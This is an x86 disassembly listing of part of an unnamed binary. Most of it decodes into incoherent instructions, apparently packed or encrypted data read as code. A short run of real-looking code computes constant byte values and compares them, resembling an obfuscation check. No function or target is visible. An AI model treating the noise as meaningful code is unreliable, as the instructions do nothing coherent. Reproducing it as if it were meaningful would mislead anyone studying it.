  41ce31:	loopne 0x41ce90
  41ce33:	xor    esp,DWORD PTR [edi+ecx*4+0x79c04b94]
  41ce3a:	xor    dl,ah
  41ce3c:	jl     0x41ce3d
  41ce3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce3f:	retf   
  41ce40:	std    
  41ce41:	pop    ds
  41ce42:	mov    fs,WORD PTR [ebp-0x279b6882]
  41ce48:	gs push ecx
  41ce4a:	mov    edi,0x2a199600
  41ce4f:	push   ss
  41ce50:	daa    
  41ce51:	retf   
  41ce52:	mov    ch,0x7
  41ce54:	pusha  
  41ce55:	frstor [edi-0x69]
  41ce58:	iret   
  41ce59:	std    
  41ce5a:	pop    eax
  41ce5b:	pop    es
  41ce5c:	jmp    0x41ce0d
  41ce5e:	push   esp
  41ce5f:	push   ebx
  41ce60:	inc    DWORD PTR [ebx]
  41ce62:	(bad)  
  41ce63:	and    cl,dl
  41ce65:	leave  
  41ce66:	fcomi  st,st(4)
  41ce68:	imul   BYTE PTR [edi-0x7e813c4b]
  41ce6e:	xor    WORD PTR [esi-0x1a51783f],sp
  41ce75:	loope  0x41ceba
  41ce77:	fisttp QWORD PTR [edx+0x707600c9]
  41ce7d:	push   ebx
  41ce7e:	repnz sbb eax,0x7ca14a37
  41ce84:	and    BYTE PTR [esi-0x653a701b],bl
  41ce8a:	out    dx,al
  41ce8b:	dec    ecx
  41ce8c:	and    eax,0xac0e4807
  41ce91:	sub    al,0x31
  41ce93:	cmp    ebp,ebp
  41ce95:	and    al,BYTE PTR [edx]
  41ce97:	xor    BYTE PTR [edx+0x70],bl
  41ce9a:	in     eax,dx
  41ce9b:	jne    0x41ce50
  41ce9d:	mov    al,ds:0x464094bf
  41cea2:	push   es
  41cea3:	in     eax,0xe9
  41cea5:	mov    BYTE PTR [edx-0x73],al
  41cea8:	add    eax,0xd8e64f17
  41cead:	mov    edi,0x610f0f8
  41ceb2:	xchg   edx,eax
  41ceb3:	xor    BYTE PTR [edx+0x74013857],bl
  41ceb9:	loop   0x41cebb
  41cebb:	dec    ebp
  41cebc:	out    0xde,eax
  41cebe:	push   ecx
  41cebf:	xchg   edi,eax
  41cec0:	pop    es
  41cec1:	not    al
  41cec3:	js     0x41cf36
  41cec5:	sahf   
  41cec6:	xchg   esi,esp
  41cec8:	pop    eax
  41cec9:	fcmovne st,st(2)
  41cecb:	mov    cl,0xb7
  41cecd:	ins    DWORD PTR es:[edi],dx
  41cece:	mov    ds:0xf018a777,al
  41ced3:	xor    BYTE PTR [edx+0x4f],cl
  41ced6:	xor    DWORD PTR [ecx+0x3bf13822],edx
  41cedc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cedd:	ds adc edi,ebp
  41cee0:	mov    ah,0x67
  41cee2:	loop   0x41cf22
  41cee4:	pop    esp
  41cee5:	aas    
  41cee6:	jg     0x41cee9
  41cee8:	inc    ebp
  41cee9:	add    DWORD PTR [esi+esi*8-0x51493d8],esi
  41cef0:	call   0x6688:0xf5d199fb
  41cef7:	jbe    0x41ce9a
  41cef9:	sbb    esi,DWORD PTR ds:[ebp+0x7a89f8cb]
  41cf00:	out    0x49,eax
  41cf02:	jnp    0x41cef8
  41cf04:	xchg   edx,eax
  41cf05:	jle    0x41cf4a
  41cf07:	xlat   BYTE PTR ds:[ebx]
  41cf08:	mov    edx,0x5c08ba3c
  41cf0d:	cmp    eax,DWORD PTR [ebx+0x5b]
  41cf10:	pushf  
  41cf11:	inc    edx
  41cf12:	xchg   esi,eax
  41cf13:	mov    ah,0x4d
  41cf15:	(bad)  [ecx+0x3dedf953]
  41cf1b:	mov    eax,ds:0x71314346
  41cf20:	adc    esp,edi
  41cf22:	push   edi
  41cf23:	pusha  
  41cf24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf25:	adc    al,BYTE PTR [esi-0x23b127d9]
  41cf2b:	cs dec ebp
  41cf2d:	pop    esi
  41cf2e:	data16 aas 
  41cf30:	leave  
  41cf31:	repz pop edi
  41cf33:	mov    al,0x77
  41cf35:	cld    
  41cf36:	shl    DWORD PTR [esi-0x4c412349],1
  41cf3c:	push   edx
  41cf3d:	pop    ds
  41cf3e:	add    BYTE PTR [ebx-0x2c],ch
  41cf41:	cli    
  41cf42:	call   0x42a4bc6b
  41cf47:	xor    BYTE PTR [ebp-0x5f09c87a],bl
  41cf4d:	ins    DWORD PTR es:[edi],dx
  41cf4e:	cmp    BYTE PTR [ebp+0x459c5cfa],cl
  41cf54:	xchg   BYTE PTR [ecx],dl
  41cf56:	push   DWORD PTR [ebx-0xd8078b3]
  41cf5c:	push   es
  41cf5d:	dec    ebx
  41cf5e:	dec    ebx
  41cf5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf60:	mov    al,0x6a
  41cf62:	int3   
  41cf63:	imul   esi,DWORD PTR [eax],0xe
  41cf66:	sub    al,0x5
  41cf68:	cmp    eax,0xbc1f2aa3
  41cf6d:	js     0x41cf31
  41cf6f:	jo     0x41cfc3
  41cf71:	sbb    al,0x94
  41cf73:	mov    esp,0xabcc0611
  41cf78:	add    esp,DWORD PTR [edi-0x54]
  41cf7b:	retf   0x787a
  41cf7e:	or     dl,BYTE PTR [ecx+ebp*8]
  41cf81:	or     ecx,DWORD PTR [edi-0x43ded743]
  41cf87:	or     al,0xc9
  41cf89:	call   0x798f:0x43b2a38
  41cf90:	mov    ebx,0x8b82d371
  41cf95:	adc    eax,0xe90de94
  41cf9a:	jno    0x41cf5b
  41cf9c:	ror    BYTE PTR [edi-0x18],1
  41cf9f:	mov    al,0xf
  41cfa1:	mov    ds:0x95c7ab04,al
  41cfa6:	cmp    eax,0x46aab3db
  41cfab:	jmp    0xd0e5:0xef27d982
  41cfb2:	fnsave cs:[ebp-0xf363832]
  41cfb9:	mov    ah,0xaa
  41cfbb:	mov    bl,0xa6
  41cfbd:	retf   0x7047
  41cfc0:	xchg   edx,eax
  41cfc1:	jno    0x41cfe1
  41cfc3:	inc    ebx
  41cfc4:	mov    ebp,0x680135c
  41cfc9:	sub    BYTE PTR [edi],ah
  41cfcb:	mov    ebp,DWORD PTR [edx-0x5d]
  41cfce:	jl     0x41d016
  41cfd0:	ret    0xb139
  41cfd3:	sbb    cl,BYTE PTR [esp+eiz*4+0x1b]
  41cfd7:	and    BYTE PTR ds:[ebp-0x75],0xee
  41cfdc:	cdq    
  41cfdd:	mov    esi,0xf91a4fe1
  41cfe2:	add    DWORD PTR [eax-0x21],0xf3de7606
  41cfe9:	adc    BYTE PTR [eax],ah
  41cfeb:	retf   0xb342
  41cfee:	and    ecx,esi
  41cff0:	outs   dx,DWORD PTR ds:[esi]
  41cff1:	mov    edi,0xd2c62465
  41cff6:	inc    ecx
  41cff7:	mov    al,ds:0xf9bfa2fd
  41cffc:	loope  0x41cf85
  41cffe:	mov    eax,ds:0xcbe03439
  41d003:	pop    edi
  41d004:	adc    DWORD PTR [ebp+0x581d1dcb],0xffffff88
  41d00b:	ja     0x41d04c
  41d00d:	jb     0x41cf95
  41d00f:	and    ebx,DWORD PTR [edi-0x199c3aa8]
  41d015:	sbb    esi,ebx
  41d017:	test   dl,dl
  41d019:	xchg   ebx,eax
  41d01a:	sbb    al,0xa2
  41d01c:	sub    ch,ch
  41d01e:	out    0xd0,eax
  41d020:	outs   dx,DWORD PTR ds:[esi]
  41d021:	lahf   
  41d022:	test   DWORD PTR [esi+0x10da20de],0xb56a40c1
  41d02c:	mov    WORD PTR [eax-0xd],ss
  41d02f:	aaa    
  41d030:	adc    bh,BYTE PTR [edx]
  41d032:	pushf  
  41d033:	sub    bl,BYTE PTR [eax-0x79]
  41d036:	test   eax,0x31a588e1
  41d03b:	or     eax,0x8ff36d28
  41d040:	inc    edx
  41d041:	jle    0x41d0ba
  41d043:	xor    esp,DWORD PTR [eax]
  41d045:	ficom  WORD PTR es:0xb4a566ca
  41d04c:	ss pop esp
  41d04e:	scas   al,BYTE PTR es:[edi]
  41d04f:	inc    ecx
  41d050:	mov    bh,0x34
  41d052:	or     BYTE PTR [ebp-0x4bc959c5],0x7e
  41d059:	xchg   edi,eax
  41d05a:	xchg   esi,eax
  41d05b:	jno    0x41d0d9
  41d05d:	jb     0x41d02b
  41d05f:	aaa    
  41d060:	fld    DWORD PTR [eax+0x45]
  41d063:	inc    esi
  41d064:	fdiv   DWORD PTR [edi]
  41d066:	sub    ebx,DWORD PTR [edx+ecx*8]
  41d069:	mov    gs:0x8fd25047,eax
  41d06f:	adc    al,0x7c
  41d071:	loope  0x41d0ea
  41d073:	pushf  
  41d074:	mov    ecx,edi
  41d076:	push   esi
  41d077:	push   ebx
  41d078:	sbb    bh,dh
  41d07a:	mov    DWORD PTR [ecx-0x78],edx
  41d07d:	data16 mov al,ds:0x6c022a99
  41d083:	pop    es
  41d084:	push   es
  41d085:	jmp    0x6ffc:0xc78b25e9
  41d08c:	jp     0x41d021
  41d08e:	push   ebp
  41d08f:	mov    dl,0x9d
  41d091:	stc    
  41d092:	inc    esi
  41d093:	and    dl,BYTE PTR [ebp-0x37ad9826]
  41d099:	sti    
  41d09a:	jge    0x41d0bf
  41d09c:	and    BYTE PTR ss:[ecx+0xb],bh
  41d0a0:	jmp    0x4890:0x7b155a34
  41d0a7:	mov    esi,0x151f2f16
  41d0ac:	push   0xf8be2871
  41d0b1:	jl     0x41d042
  41d0b3:	(bad)  
  41d0b4:	stos   BYTE PTR es:[edi],al
  41d0b5:	out    dx,al
  41d0b6:	xchg   edi,eax
  41d0b7:	inc    edx
  41d0b8:	sbb    ebp,DWORD PTR [esi+0x15e16d23]
  41d0be:	cmp    esp,DWORD PTR [edx+0x65abba36]
  41d0c4:	sbb    eax,0x48fe3e25
  41d0c9:	jl     0x41d092
  41d0cb:	and    eax,0xc12a9be4
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x9fbc6585
  41d15f:	cmc    
  41d160:	pop    ecx
  41d161:	stos   BYTE PTR es:[edi],al
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1+0x6c691818],bh
  41d16c:	adc    DWORD PTR [edi],esp
  41d16e:	nop
  41d16f:	or     BYTE PTR [ebp+0x3748c78c],0xa5
  41d176:	inc    esi
  41d177:	cdq    
  41d178:	ja     0x41d1bb
  41d17a:	push   es
  41d17b:	cmp    cl,ch
  41d17d:	add    eax,0x88491da4
  41d182:	xor    BYTE PTR [edx-0x5e],0x45
  41d186:	push   ecx
  41d187:	sar    DWORD PTR ds:0x9c4ee792,cl
  41d18d:	jp     0x41d1e3
  41d18f:	or     dl,bh
  41d191:	push   esi
  41d192:	mov    esi,0x83470a43
  41d197:	icebp  
  41d198:	mov    ah,0xd3
  41d19a:	cdq    
  41d19b:	mov    edi,0x76be0149
  41d1a0:	scas   eax,DWORD PTR es:[edi]
  41d1a1:	xchg   ebx,eax
  41d1a2:	sub    ecx,DWORD PTR [ecx-0x703970c9]
  41d1a8:	scas   eax,DWORD PTR es:[edi]
  41d1a9:	mov    ds:0x2e28ec87,eax
  41d1ae:	push   edx
  41d1af:	mov    ah,0x8d
  41d1b1:	mov    al,ds:0x194c5ebd
  41d1b6:	cs sti 
  41d1b8:	sbb    DWORD PTR [ebx-0x11d70636],esp
  41d1be:	sbb    eax,0x33cec6c0
  41d1c3:	mov    dh,al
  41d1c5:	sar    BYTE PTR ds:0xc33d52f5,cl
  41d1cb:	pop    edx
  41d1cc:	cdq    
  41d1cd:	(bad)  
  41d1ce:	call   0x7e64:0xab87a0b2
  41d1d5:	inc    ebx
  41d1d6:	add    eax,0x451ed6b
  41d1db:	adc    BYTE PTR gs:[ecx+ecx*1+0x2c],dh
  41d1e0:	mov    dh,0x78
  41d1e2:	and    BYTE PTR [edi-0xf68f4b0],bh
  41d1e8:	and    DWORD PTR [eax],edx
  41d1ea:	cmp    al,0x92
  41d1ec:	mov    DWORD PTR [ecx],ebx
  41d1ee:	xchg   ebx,eax
  41d1ef:	add    eax,0xc8be504b
  41d1f4:	jmp    0xe89df575
  41d1f9:	cmc    
  41d1fa:	mov    ds:0x331b0963,eax
  41d1ff:	mov    dh,dl
  41d201:	clc    
  41d202:	daa    
  41d203:	mov    bh,0xfe
  41d205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d206:	std    
  41d207:	retf   
  41d208:	in     al,dx
  41d209:	shr    DWORD PTR [edx+0x5cbce8c4],0xaa
  41d210:	or     dl,al
  41d212:	dec    eax
  41d213:	mov    ebx,0xd3ea0048
  41d218:	sar    DWORD PTR [ebp+ebp*2-0x4edbce5b],1
  41d21f:	dec    eax
  41d220:	sar    BYTE PTR [edi+0x35],1
  41d223:	xor    ah,ch
  41d225:	xchg   esi,eax
  41d226:	xor    BYTE PTR [ebp-0x46],0xd2
  41d22a:	mov    ds:0xade7eb55,al
  41d22f:	int3   
  41d230:	pop    edx
  41d231:	ret    0x3d26
  41d234:	in     al,0x53
  41d236:	mov    ch,0x8f
  41d238:	daa    
  41d239:	ss aam 0xbb
  41d23c:	test   DWORD PTR [esi],edx
  41d23e:	test   BYTE PTR [edi],al
  41d240:	jg     0x41d2a2
  41d242:	jg     0x41d2be
  41d244:	jl     0x41d21e
  41d246:	mov    ch,0x6b
  41d248:	repz jecxz 0x41d1d6
  41d24b:	(bad)  
  41d24c:	sbb    eax,DWORD PTR [eax+0x5c]
  41d24f:	mov    edx,0xb3f96c66
  41d254:	mov    eax,0xa7d8793a
  41d259:	add    ebx,DWORD PTR [edx+0x2bd5150c]
  41d25f:	in     al,dx
  41d260:	pop    esp
  41d261:	aad    0xa0
  41d263:	mov    ecx,0xf06e4eb8
  41d268:	imul   edi,DWORD PTR [eax+esi*1],0xffffffa8
  41d26c:	cld    
  41d26d:	xor    edi,DWORD PTR [eax+edi*4+0x4a4eeae4]
  41d274:	xchg   DWORD PTR [ebx+0x8],esi
  41d277:	ret    0xedc4
  41d27a:	jg     0x41d2a7
  41d27c:	jne    0x41d20f
  41d27e:	imul   esp,DWORD PTR [ecx],0xdd927642
  41d284:	mov    ecx,0x9a001b96
  41d289:	sbb    BYTE PTR [ebx+0x5683062b],ch
  41d28f:	jns    0x41d2a0
  41d291:	repz jbe 0x41d2f2
  41d294:	popa   
  41d295:	mov    bh,0xc6
  41d297:	lock or DWORD PTR [ecx+0x342b7947],eax
  41d29e:	inc    edx
  41d29f:	cmp    BYTE PTR [esi+0x3f],cl
  41d2a2:	mov    ecx,0xfebf7f6c
  41d2a7:	aad    0x89
  41d2a9:	mov    dh,0x3f
  41d2ab:	mov    eax,0xa657a8a7
  41d2b0:	sti    
  41d2b1:	out    0xb4,eax
  41d2b3:	jnp    0x41d2af
  41d2b5:	dec    esp
  41d2b6:	imul   esi,ecx,0x89fb10
  41d2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2bd:	mov    ebp,0x6c3778b8
  41d2c2:	mov    eax,0x480ca3c5
  41d2c7:	mov    cl,0xf
  41d2c9:	bound  eax,QWORD PTR [esi]
  41d2cb:	mov    dh,ah
  41d2cd:	adc    eax,0x3c802140
  41d2d2:	dec    esi
  41d2d3:	hlt    
  41d2d4:	mov    ecx,DWORD PTR [esi+0x75]
  41d2d7:	test   eax,0x556b4b5d
  41d2dc:	test   eax,0x3c167e36
  41d2e1:	dec    edx
  41d2e2:	out    0x6e,al
  41d2e4:	pop    ecx
  41d2e5:	push   ebp
  41d2e6:	shr    edx,1
  41d2e8:	jge    0x41d2e0
  41d2ea:	adc    bh,dh
  41d2ec:	mov    edi,0x404733a6
  41d2f1:	ja     0x41d282
  41d2f3:	push   ss
  41d2f4:	adc    bl,ah
  41d2f6:	and    al,0x48
  41d2f8:	fbld   TBYTE PTR [esi-0x3b]
  41d2fb:	mov    edx,0xd251e455
  41d300:	loop   0x41d29a
  41d302:	fcom   QWORD PTR [edi-0x1dd1b07]
  41d308:	aaa    
  41d309:	retf   0xc43d
  41d30c:	sbb    bl,BYTE PTR [esp+eiz*2+0x3b6149c2]
  41d313:	rol    DWORD PTR [edx-0x26],0x54
  41d317:	sub    eax,0x5569a926
  41d31c:	add    ebx,DWORD PTR [edi-0x14]
  41d31f:	popf   
  41d320:	pop    esi
  41d321:	add    eax,0x81f59c7b
  41d326:	inc    esi
  41d327:	scas   al,BYTE PTR es:[edi]
  41d328:	xchg   esi,eax
  41d329:	hlt    
  41d32a:	scas   al,BYTE PTR es:[edi]
  41d32b:	or     cl,ah
  41d32d:	cmp    esp,edi
  41d32f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d330:	and    al,0x79
  41d332:	test   al,0x76
  41d334:	mov    dh,dl
  41d336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d337:	dec    edx
  41d338:	dec    ebp
  41d339:	pop    ecx
  41d33a:	push   edi
  41d33b:	fcmovnbe st,st(4)
  41d33d:	cmp    eax,0xc301d106
  41d342:	add    edx,ebx
  41d344:	adc    DWORD PTR [esi+0x63],esi
  41d347:	ins    DWORD PTR es:[edi],dx
  41d348:	fsubr  DWORD PTR [edi+ebx*2-0x8]
  41d34c:	cmp    BYTE PTR [ebp-0x7d],dh
  41d34f:	jp     0x41d3d0
  41d351:	xchg   ecx,eax
  41d352:	adc    dl,BYTE PTR [edi]
  41d354:	xchg   ebx,eax
  41d355:	pop    bx
  41d357:	fstp   TBYTE PTR [esi]
  41d359:	or     eax,0xa549e5a3
  41d35e:	in     eax,dx
  41d35f:	jbe    0x41d3bf
  41d361:	fisttp QWORD PTR [eax-0x352bdcf8]
  41d367:	mov    esi,DWORD PTR [edi+0x69134130]
  41d36d:	ins    BYTE PTR es:[edi],dx
  41d36e:	arpl   WORD PTR [ebx-0x1ef3685d],cx
  41d374:	ret    0x2905
  41d377:	mov    edi,0x5eb7ceda
  41d37c:	mov    edi,0xd317d8c3
  41d381:	(bad)  
  41d382:	cld    
  41d383:	push   eax
  41d384:	mov    eax,0x455ebc67
  41d389:	mov    al,ds:0xbe41ab56
  41d38e:	les    esp,FWORD PTR [ecx-0x33e17b19]
  41d394:	inc    edx
  41d395:	add    ah,bl
  41d397:	mov    dh,0xb
  41d399:	mov    esp,0x28518d5
  41d39e:	jnp    0x41d38a
  41d3a0:	imul   ebp,DWORD PTR [eax+0x32],0xfffffff1
  41d3a4:	(bad)  
  41d3a5:	mov    dh,0xb3
  41d3a7:	pushf  
  41d3a8:	cdq    
  41d3a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3aa:	or     dh,cl
  41d3ac:	xor    al,0x2c
  41d3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3af:	rol    edi,0xe
  41d3b2:	lods   al,BYTE PTR ds:[esi]
  41d3b3:	or     dl,BYTE PTR [ecx+edx*2-0x3c400b9e]
  41d3ba:	sti    
  41d3bb:	jle    0x41d42c
  41d3bd:	in     al,0xbc
  41d3bf:	aam    0x51
  41d3c1:	test   ebp,0x5b8d6088
  41d3c7:	das    
  41d3c8:	mov    dh,0x95
  41d3ca:	push   eax
  41d3cb:	arpl   WORD PTR [eax+ebx*1+0x46c800d5],dx
  41d3d2:	add    BYTE PTR [esi],0x69
  41d3d5:	and    al,0x60
  41d3d7:	rol    BYTE PTR [edx-0x1a],cl
  41d3da:	mov    cl,0x23
  41d3dc:	mov    BYTE PTR [eax+0x2c],bh
  41d3df:	mov    ds:0x6eb222a6,al
  41d3e4:	sub    eax,0xdddab24f
  41d3e9:	arpl   WORD PTR [eax-0x1f],dx
  41d3ec:	jb     0x41d452
  41d3ee:	sub    BYTE PTR [bp-0xeb6],bl
  41d3f3:	push   esi
  41d3f4:	ffree  st(0)
  41d3f6:	cmp    al,0x9b
  41d3f8:	call   0x145:0xfe07f73f
  41d3ff:	sub    BYTE PTR [ebx-0x6f],ch
  41d402:	mov    ebx,0x1fee193d
  41d407:	test   BYTE PTR [edx+eax*1],dl
  41d40a:	retf   
  41d40b:	es sbb ecx,edi
  41d40e:	clc    
  41d40f:	jbe    0x41d48e
  41d411:	sub    al,0xb3
  41d413:	pop    edx
  41d414:	nop
  41d415:	pop    ebx
  41d416:	(bad)  
  41d417:	int    0x1f
  41d419:	add    BYTE PTR [ebp-0x73],0x73
  41d41d:	inc    edi
  41d41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41f:	push   esi
  41d420:	icebp  
  41d421:	(bad)  
  41d422:	enter  0xdba1,0x52
  41d426:	push   edx
  41d427:	shl    DWORD PTR [ecx+0x621b5b11],0xef
  41d42e:	test   DWORD PTR [edi+0x6d62540e],esp
  41d434:	dec    esp
  41d435:	sub    ebp,DWORD PTR [edi]
  41d437:	pushf  
  41d438:	xchg   BYTE PTR [ecx],ah
  41d43a:	sub    DWORD PTR [ecx],esp
  41d43c:	cmp    BYTE PTR cs:[esi+0x5ebd6cd3],0x7e
  41d444:	fisubr WORD PTR [edi+0x50d88a7b]
  41d44a:	push   esp
  41d44b:	pushf  
  41d44c:	mov    dl,0xb5
  41d44e:	and    ch,cl
  41d450:	add    ah,BYTE PTR [ebx+edi*1+0x3daa53f1]
  41d457:	dec    edx
  41d458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d459:	mov    edx,0x8b9d3192
  41d45e:	inc    eax
  41d45f:	pop    es
  41d460:	pop    ebx
  41d461:	sbb    eax,DWORD PTR [ebx]
  41d463:	das    
  41d464:	inc    esp
  41d465:	lahf   
  41d466:	aad    0x14
  41d468:	pop    edi
  41d469:	mov    bh,0xff
  41d46b:	xlat   BYTE PTR ds:[ebx]
  41d46c:	(bad)  
  41d46d:	in     eax,0x53
  41d46f:	mov    edi,0x863e7d7
  41d474:	lock lock jg 0x41d44e
  41d478:	mul    BYTE PTR [edi+ecx*4+0x234a69c2]
  41d47f:	or     al,0x3b
  41d481:	sbb    BYTE PTR [edx-0x5bbc1ebe],bh
  41d487:	test   DWORD PTR [eax],edi
  41d489:	sub    DWORD PTR [ecx],esp
  41d48b:	ret    
  41d48c:	jge    0x41d4c2
  41d48e:	out    0x1b,al
  41d490:	cmp    DWORD PTR [esp+ebp*1+0x1a],ebx
  41d494:	sti    
  41d495:	mov    esp,0xfc4b7eb6
  41d49a:	adc    al,dh
  41d49c:	xchg   edx,eax
  41d49d:	stos   DWORD PTR es:[edi],eax
  41d49e:	inc    ecx
  41d49f:	jl     0x41d4fd
  41d4a1:	push   0xffffffa0
  41d4a3:	lock retf 0x9a14
  41d4a7:	mov    BYTE PTR [ebx],ah
  41d4a9:	jnp    0x41d4be
  41d4ab:	and    eax,0xe9f274ce
  41d4b0:	jb     0x41d489
  41d4b2:	pop    edi
  41d4b3:	push   eax
  41d4b4:	gs daa 
  41d4b6:	sti    
  41d4b7:	arpl   WORD PTR [edi],dx
  41d4b9:	gs imul esp,DWORD PTR cs:[ecx],0x3cc865db
  41d4c1:	pop    DWORD PTR [bp-0x11]
  41d4c5:	xchg   esp,eax
  41d4c6:	call   0x170b:0x6313f4e8
  41d4cd:	push   ds
  41d4ce:	xchg   ebp,eax
  41d4cf:	cmc    
  41d4d0:	sub    bl,BYTE PTR [esi+0x6124dfb6]
  41d4d6:	adc    eax,0x84476909
  41d4db:	gs mov esp,0x5f2bedbc
  41d4e1:	inc    ebp
  41d4e2:	sbb    edi,edi
  41d4e4:	jns    0x41d4a3
  41d4e6:	rcr    ebp,1
  41d4e8:	jecxz  0x41d4b4
  41d4ea:	mov    al,0xdb
  41d4ec:	sti    
  41d4ed:	cld    
  41d4ee:	xchg   ebp,eax
  41d4ef:	jb     0x41d55c
  41d4f1:	xchg   esp,eax
  41d4f2:	ret    0x5e2f
  41d4f5:	mov    al,0xad
  41d4f7:	jbe    0x41d518
  41d4f9:	mov    dl,0xa
  41d4fb:	call   0x5f47:0xc58e7337
  41d502:	cmp    BYTE PTR [ebp-0x36],dh
  41d505:	push   esp
  41d506:	lods   eax,DWORD PTR ds:[esi]
  41d507:	cdq    
  41d508:	adc    DWORD PTR [ebx],0xee352baa
  41d50e:	adc    al,0xf
  41d510:	lahf   
  41d511:	loope  0x41d49a
  41d513:	cmc    
  41d514:	int    0xbb
  41d516:	inc    eax
  41d517:	cli    
  41d518:	pushf  
  41d519:	sub    BYTE PTR [esi+ebp*4],cl
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d55b
  41d54b:	sub    BYTE PTR [edi],0xbe
  41d54e:	ficom  DWORD PTR [ebp+0x16]
  41d551:	sbb    BYTE PTR [edx+edx*1-0x4b5fe7e8],bh
  41d558:	jbe    0x41d550
  41d55a:	inc    esp
  41d55b:	jle    0x41d520
  41d55d:	lods   al,BYTE PTR ds:[esi]
  41d55e:	push   esp
  41d55f:	lods   al,BYTE PTR ds:[esi]
  41d560:	mov    ebp,0x23b8c5b5
  41d565:	fmul   QWORD PTR [ecx-0x36]
  41d568:	xor    ecx,DWORD PTR [edi+ebp*2]
  41d56b:	push   ebx
  41d56c:	xchg   esi,eax
  41d56d:	adc    ecx,DWORD PTR [ebx+0x41cd2564]
  41d573:	aad    0x71
  41d575:	lods   al,BYTE PTR ds:[esi]
  41d576:	cmp    esp,ebp
  41d578:	rcl    DWORD PTR [edi-0x1024df2a],1
  41d57e:	push   ecx
  41d57f:	pop    ecx
  41d580:	xchg   edi,eax
  41d581:	mov    ebx,0xd43ed62d
  41d586:	sbb    BYTE PTR [eax+0x31d69ff2],0xca
  41d58d:	cmc    
  41d58e:	outs   dx,BYTE PTR ds:[esi]
  41d58f:	lods   al,BYTE PTR ds:[esi]
  41d590:	cmc    
  41d591:	xor    DWORD PTR [ecx+0x4ce102fd],ebp
  41d597:	test   DWORD PTR [edx],ebp
  41d599:	pop    ss
  41d59a:	out    dx,al
  41d59b:	pop    es
  41d59c:	mov    bh,0x14
  41d59e:	xchg   edx,eax
  41d59f:	stc    
  41d5a0:	out    dx,al
  41d5a1:	inc    esi
  41d5a2:	shl    DWORD PTR [eax],0x9c
  41d5a5:	outs   dx,BYTE PTR ds:[esi]
  41d5a6:	mov    ah,0xbf
  41d5a8:	cmp    dx,WORD PTR [esi]
  41d5ab:	sti    
  41d5ac:	sbb    edx,DWORD PTR [ebp-0x3cdebecf]
  41d5b2:	inc    edx
  41d5b3:	(bad)  
  41d5b4:	nop
  41d5b5:	lods   eax,DWORD PTR ds:[esi]
  41d5b6:	test   DWORD PTR [edi+0x52],eax
  41d5b9:	xlat   BYTE PTR ds:[ebx]
  41d5ba:	mov    esp,0xa2f1c1ae
  41d5bf:	(bad)  [ecx-0x704b0dd6]
  41d5c5:	lahf   
  41d5c6:	(bad)  
  41d5c7:	rcl    DWORD PTR [ebp-0x2d],1
  41d5ca:	fimul  DWORD PTR [edi+ebp*1+0x31]
  41d5ce:	inc    eax
  41d5cf:	ins    BYTE PTR es:[edi],dx
  41d5d0:	add    ch,BYTE PTR [ecx-0x1220c6df]
  41d5d6:	loopne 0x41d5a4
  41d5d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5d9:	call   0xcd5b:0xcc977f6b
  41d5e0:	or     al,0x45
  41d5e2:	stos   DWORD PTR es:[edi],eax
  41d5e3:	jecxz  0x41d5a0
  41d5e5:	sahf   
  41d5e6:	inc    ebx
  41d5e7:	lods   al,BYTE PTR ds:[esi]
  41d5e8:	cmp    cl,BYTE PTR [esi+0xca6e42a]
  41d5ee:	fstp   DWORD PTR [esp+ebx*2+0x6144369e]
  41d5f5:	sar    cl,0x79
